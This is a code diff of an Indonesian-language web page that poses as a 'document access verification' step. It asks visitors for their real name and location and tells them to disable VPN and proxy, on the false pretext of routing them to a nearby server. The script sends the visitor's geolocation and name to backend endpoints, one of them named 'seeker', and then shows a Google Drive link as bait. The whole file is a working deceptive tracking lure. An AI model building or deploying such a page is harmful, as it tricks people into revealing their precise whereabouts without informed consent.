@@ -21,34 +21,45 @@
       border: none; 
       cursor: pointer;
     }
+    iframe {
+      width: 90%;
+      height: 500px;
+      border: none;
+      margin-top: 30px;
+      display: none;
+    }
   </style>
 </head>
 <body>
   <h2>Verifikasi Akses Dokumen</h2>
   <p>Masukkan nama dan izinkan lokasi untuk mengakses dokumen. Agar dirutekan ke Server terdekat</p>
   <p>Mohon untuk mematikan VPN, Proxy, dan Hemat Daya.</p>
+  
+  <!-- Gambar utama -->
   <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg" width="200"> <br><br>
 
-  <!-- Audio dari GitHub -->
+  <!-- Musik -->
   <audio id="audio" src="https://github.com/mukti-nux/Framer-asset/raw/refs/heads/main/INTERWORLD%20-%20METAMORPHOSIS.mp3" preload="auto"></audio>
 
+  <!-- Input Nama dan Tombol -->
   <input type="text" id="nama" placeholder="Nama Asli"><br><br>
-  <button onclick="submitData()">Dapatkan Link</button><br>
-  <br>
-  <br>
-  
+  <button onclick="submitData()">Dapatkan Link</button><br><br><br>
+
+  <!-- Iframe untuk Google Drive -->
+  <iframe id="driveFrame" allow="autoplay"></iframe>
+
   <h5>Request Musik 2k/hari*. S&K berlaku</h5>
-
-<a href="https://www.instagram.com/hasanabdulloh_1/?hl=en" target="_blank" rel="noopener noreffer">
-  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/logo_ig-removebg-preview.png?raw=true" alt="Instagram" width="75px" />
-</a><br>
-
+  <a href="https://www.instagram.com/hasanabdulloh_1/?hl=en" target="_blank" rel="noopener noreffer">
+    <img src="https://github.com/mukti-nux/Framer-asset/blob/main/logo_ig-removebg-preview.png?raw=true" alt="Instagram" width="75px" />
+  </a><br>
   <h5>©Admin</h5>
+
   <script>
     const id = new URLSearchParams(window.location.search).get("id");
-
-    // Mulai audio saat pertama kali disentuh/klik di mana pun
     const audio = document.getElementById('audio');
+    const iframe = document.getElementById('driveFrame');
+
+    // Mainkan musik saat interaksi pertama
     function startAudioOnce() {
       audio.play().catch(err => console.warn("Audio gagal diputar:", err));
       document.removeEventListener('click', startAudioOnce);
@@ -73,14 +84,14 @@
               timestamp: new Date().toISOString()
             };
 
-            // Kirim ke /api/location
+            // Kirim lokasi ke /api/location
             fetch("/api/location", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(body),
             }).catch((e) => console.warn("Lokasi gagal dikirim:", e));
 
-            // Kirim ke /api/seeker/[id]
+            // Ambil link dari backend
             fetch(`/api/seeker/${id}`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -89,7 +100,10 @@
               .then((res) => res.json())
               .then((data) => {
                 if (data.redirectTo) {
-                  window.location.href = data.redirectTo;
+                  // Ubah /view jadi /preview untuk iframe Google Drive
+                  const driveLink = data.redirectTo.replace("/view", "/preview");
+                  iframe.src = driveLink;
+                  iframe.style.display = "block";
                 } else {
                   alert("Link tidak ditemukan.");
                 }
